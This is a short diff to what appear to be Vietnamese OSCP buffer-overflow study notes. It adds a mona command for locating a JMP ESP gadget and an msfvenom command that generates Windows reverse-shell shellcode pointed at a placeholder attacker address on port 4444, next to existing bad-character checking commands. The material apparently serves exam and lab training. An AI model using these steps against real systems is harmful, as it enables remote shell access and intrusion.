@@ -8,6 +8,9 @@ TL;DR:
 
 !mona bytearray -b "\x00"
 !mona compare -f C:\mona\oscp\bytearray.bin -a
+
+!mona jmp -r esp -cpb <bad chars>
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b <barchars> -f c
 ```
 
 ## Bước 1: Khởi tạo
